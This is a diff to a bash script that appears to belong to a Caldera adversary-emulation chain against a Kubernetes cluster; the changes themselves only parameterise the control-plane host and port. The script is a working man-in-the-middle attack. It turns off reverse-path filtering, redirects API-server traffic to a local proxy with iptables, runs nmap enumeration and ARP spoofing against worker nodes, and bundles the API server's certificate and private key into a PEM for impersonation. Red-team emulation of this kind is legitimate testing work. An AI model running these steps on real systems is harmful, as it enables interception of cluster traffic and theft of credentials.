@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-UPSTREAM_HOST="$CLUSTER_NAME-control-plane"
-UPSTREAM_PORT="6443"
+UPSTREAM_HOST="$CONTROL_PLANE_NODE"
+UPSTREAM_PORT="$CONTROL_PLANE_PORT"
 IFACE="eth0"
 LOGDIR="$DATA_PATH/KC5/logdir"
 PIDFILE="$DATA_PATH/KC5/arp_pids"
@@ -31,13 +31,13 @@ sysctl -w net.ipv4.conf.all.rp_filter=0
 sysctl -w net.ipv4.conf."$IFACE".rp_filter=0
 sysctl -w net.ipv4.ip_forward=1
 
-# 3) REDIRECT TCP traffic directed to VIP:6443 to local port 6443 (proxy)
+# 3) REDIRECT TCP traffic directed to VIP:CONTROL_PLANE_PORT to local port CONTROL_PLANE_PORT (proxy)
 if ! iptables -t nat -C PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT" 2>/dev/null; then
   iptables -t nat -A PREROUTING -i "$IFACE" -p tcp -d "$IPAPI" --dport "$UPSTREAM_PORT" -j REDIRECT --to-ports "$UPSTREAM_PORT"
 fi
 
 /opt/caldera/KC2/nmap-enum.sh $DATA_PATH/KC5
-/opt/caldera/KC2/arp-spoof.sh "$IPAPI" "$DATA_PATH/KC5/iphost" "$DATA_PATH/KC5/node_traffic" "$DATA_PATH/KC5/tcpdump_stdout_err.log" "worker" $PIDFILE
+/opt/caldera/KC2/arp-spoof.sh "$IPAPI" "/tmp/iphost" "$DATA_PATH/KC5/node_traffic" "$DATA_PATH/KC5/tcpdump_stdout_err.log" "worker" $PIDFILE
 
 cat /apiserver/apiserver.crt /apiserver/apiserver.key > $LEAF_PEM
 
